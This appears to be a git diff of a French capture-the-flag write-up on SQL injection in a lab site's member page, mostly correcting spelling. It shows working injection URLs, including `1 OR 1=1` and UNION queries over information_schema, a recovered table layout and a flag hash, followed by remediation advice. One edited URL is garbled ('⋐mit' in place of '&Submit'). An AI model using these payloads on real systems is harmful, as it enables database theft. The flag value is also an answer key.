@@ -3,12 +3,11 @@
 #### Page: _/index.php?page=member_
 
 
-## Déscription de la vulnerabilité:
-Taper n'importe quelle chaîne de caractères dans le champ `id` renvoie une erreur
-indiquant l'utilisation d'une base de donnée SQL côté serveur.  
-La requête est réalisée en methode GET et les paramêtres sont passés dans l'URL:
+## Description de la vulnerabilité :
+Taper n'importe quelle chaîne de caractères dans le champ `id` renvoie une erreur indiquant l'utilisation d'une base de donnée SQL côté serveur.
+La requête est réalisée en méthode GET et les paramètres sont passés dans l'URL :
 ```
-/?page=member&id=lala&Submit=Submit#
+/?page=member&id=lala⋐mit=Submit#
 ```
 
 On teste `1 OR 1=1` comme valeur d'`id` et on obtient:
@@ -30,13 +29,12 @@ First name: Flag
 Surname : GetThe
 ```
 
-Cela indique que ce que l'on passe dans l'`id` est interprêté côté serveur comme du SQL.
+Cela indique que ce que l'on passe dans l'`id` est interprété côté serveur comme du SQL.
 On détermine également que deux colonnes sont renvoyées par la requête SQL.
 
-On utilise `information_schema` qui permet de récuperer des leta data de la
-base de donnees SQL.
+On utilise `information_schema` qui permet de récupérer des metadatas de la base de données SQL.
 
-L'injection SQL suivante nous permet d'obtenir les schémas et les tables de la base:
+L'injection SQL suivante nous permet d'obtenir les schémas et les tables de la base :
 ```
 /?page=member&id=1 union select table_schema, table_name from information_schema.tables&Submit=Submit#
 ```
@@ -49,14 +47,14 @@ L'injection SQL suivante nous permet d'obtenir les schémas et les tables de la 
  Member_survey.vote_dbs
  ```
 
-A l'aide de l'injéction suivante, on récupére les colonnes de l'ensemble des tables:
+À l'aide de l'injection suivante, on récupère les colonnes de l'ensemble des tables :
 ```
 /?page=member&id=1 union select table_name, column_name from information_schema.columns &Submit=Submit#
 ```
 
 On utilise la commande `UNION` de SQL qui permet de mettre bout-à-bout les résultats de plusieurs requêtes.
 
-Ainsi, on détermine que la base de données ressemble à:  
+Ainsi, on détermine que la base de données ressemble à :  
 Table `db_default`:
 ```
 id
@@ -116,18 +114,11 @@ On passe `FourtyTwo` en `lowercase` puis on hash en sha256:
 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 ```
 
-## Scénario d'attaque:
-Une vulnerabilité de type injection SQL peut permettre d'accéder ou de
-modifier une base de données de type SQL.
-Dans certains cas, comme celui ci, la faille permet de récupérer l'intégralité
-du contenu de la base, dont les idendifiants et les mots de passe des utilisateurs
-du site.
+## Scénario d'attaque :
+Une vulnérabilité de type injection SQL peut permettre d'accéder ou de modifier une base de données de type SQL.
+Dans certains cas, comme celui-ci, la faille permet de récupérer l'intégralité du contenu de la base, dont les identifiants et les mots de passe des utilisateurs du site.
 
-
-## Correctifs:
-- Utiliser `mysqli_real_escape_string()` afin d'échapper les caractères spéciaux
-provenant des entrées utilisateur.
-- Utiliser des procédures stockées, qui sont des instructions SQL précompilées,
- à la place du SQL dynamique.
-- La plupart des ORM utilisent des systèmes de requêtes préparées dans lesquelles
-le SGBD se charge alors de l'echappement et du contrôle des requêtes.
+## Correctifs :
+- Utiliser `mysqli_real_escape_string()` afin d'échapper les caractères spéciaux provenant des entrées utilisateur.
+- Utiliser des procédures stockées, qui sont des instructions SQL précompilées,  à la place du SQL dynamique.
+- La plupart des ORM utilisent des systèmes de requêtes préparées dans lesquelles le SGBD se charge alors de l’échappement et du contrôle des requêtes.
